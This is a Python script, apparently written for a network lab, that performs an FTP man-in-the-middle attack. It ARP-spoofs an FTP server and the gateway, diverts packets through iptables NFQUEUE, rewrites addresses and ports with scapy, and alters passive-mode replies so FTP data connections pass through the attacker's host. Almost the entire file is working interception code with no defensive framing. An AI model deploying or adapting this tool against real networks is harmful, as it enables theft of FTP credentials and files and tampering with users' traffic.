from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, send
import threading
import re
import subprocess

# Configuration
mitm_ip = "192.168.3.131"
mitm_ftp_port = 2121
gateway_ip = "192.168.3.1"
ftp_ip = "192.168.3.30"
interface_name = "ens33"

ftp_port = 21
ftp_data_port = []


def start_arpspoof(ip1, ip2):
    print("Arpspoofing")
    print(ip1, ip2)
    p1 = subprocess.Popen(
        ["arpspoof", "-i", interface_name, "-t", ip1, ip2],
        stderr=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
    )
    p2 = subprocess.Popen(
        ["arpspoof", "-i", interface_name, "-t", ip2, ip1],
        stderr=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
    )

    p1.wait()
    p2.wait()


def add_iptable_rules():
    """Add the relevant netfilterqueue rules to iptables"""
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "PREROUTING",
            "-i",
            interface_name,
            "-j",
            "NFQUEUE",
            "--queue-num",
            "1",
        ]
    )
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "POSTROUTING",
            "-o",
            interface_name,
            "-j",
            "NFQUEUE",
            "--queue-num",
            "2",
        ]
    )


def flush_iptable_rules():
    subprocess.check_output(["iptables", "--table", "mangle", "--flush"])


def is_ftp(pkt):
    """Returns true if the packet is FTP"""

    if TCP not in pkt:
        return False

    return pkt[TCP].sport == ftp_port or pkt[TCP].dport == ftp_port


def is_ftp_data_port(pkt):
    """Returns true if the packet is ftp data port"""

    print(ftp_data_port)
    if TCP not in pkt:
        return
    return pkt[TCP].sport in ftp_data_port or pkt[TCP].dport in ftp_data_port


def to_intercept_packet(pkt):
    """Conditions:
    1. FTP or FTP_DATA_PORT
    2. Make sure that the destination ip match too

    (ftp or ftp_data_port) and ftp_ip
    """
    print("Destination IP match", IP in pkt and pkt[IP].dst == ftp_ip)
    print("Ports correct", is_ftp(pkt) or is_ftp_data_port(pkt))

    if IP not in pkt:
        return False

    return pkt[IP].dst == ftp_ip and (is_ftp(pkt) or is_ftp_data_port(pkt))


def incoming(packet):
    """Intercepts all incoming packets"""
    pkt = IP(packet.get_payload())
    print("Incoming: ", pkt.summary())

    if pkt[IP].dst == mitm_ip:
        # If directed at MiTM, drop the packet
        packet.drop()
        return

    if not to_intercept_packet(pkt):
        # "Forwards" the packet normally
        send(pkt)
        packet.drop()
        return

    pkt[IP].dst = mitm_ip

    if TCP in pkt and pkt[TCP].dport == ftp_port:
        pkt[TCP].dport = mitm_ftp_port

    pkt[IP].len = None
    pkt[IP].chksum = None

    if TCP in pkt:
        pkt[TCP].chksum = None

    print("Modified: ", pkt.summary())
    packet.set_payload(bytes(pkt))
    packet.accept()


def modify_ftp_packet(pkt):
    """Modifies the ftp packet such that it points to the MiTM"""
    if TCP not in pkt:
        return

    if not pkt[TCP].payload:
        return

    content = pkt[TCP].load.decode().strip()
    regex = r"227 Entering passive mode \([\d]{1,3},[\d]{1,3},[\d]{1,3},[\d]{1,3},([\d]{1,3},[\d]{1,3})\)"  # It just works
    result = re.match(regex, content)
    if result:
        ip = ftp_ip.replace(".", ",")
        port = result.group(1)

        calculated_port = list(map(int, port.split(",")))
        calculated_port = calculated_port[0] * 256 + calculated_port[1]
        print("\n\nCalculated: ", calculated_port)
        global ftp_data_port
        ftp_data_port.append(calculated_port)
        print(ftp_data_port)
        content = f"227 Entering passive mode ({ip},{port})"
        pkt[TCP].remove_payload()
        pkt[TCP].add_payload(content)
        return

    # TODO:
    if content == "226 Transfer complete.":
        # ftp_data_port.pop()
        pass


def outgoing(packet):
    """Intercepts all outgoing traffic handler"""
    pkt = IP(packet.get_payload())
    print("Outgoing: ", pkt.summary())
    if IP in pkt and pkt[IP].src == mitm_ip:
        pkt[IP].src = ftp_ip

        if TCP in pkt and pkt[TCP].sport == mitm_ftp_port:
            pkt[TCP].sport = ftp_port

    if is_ftp(pkt):
        modify_ftp_packet(pkt)

    pkt[IP].len = None
    pkt[IP].chksum = None

    if TCP in pkt:
        pkt[TCP].chksum = None

    print("Modified: ", pkt.summary())
    packet.set_payload(bytes(pkt))
    packet.accept()


def main():
    threading.Thread(target=start_arpspoof, args=(ftp_ip, gateway_ip)).start()
    flush_iptable_rules()
    add_iptable_rules()

    # Netfilter Interception
    nf1 = NetfilterQueue()
    nf1.bind(1, incoming)

    nf2 = NetfilterQueue()
    nf2.bind(2, outgoing)
    try:
        t1 = threading.Thread(target=nf1.run)
        t2 = threading.Thread(target=nf2.run)

        t1.start()
        t2.start()
        t2.join()
    except KeyboardInterrupt:
        print("")

    nf1.unbind()
    nf2.unbind()
    flush_iptable_rules()


if __name__ == "__main__":
    main()
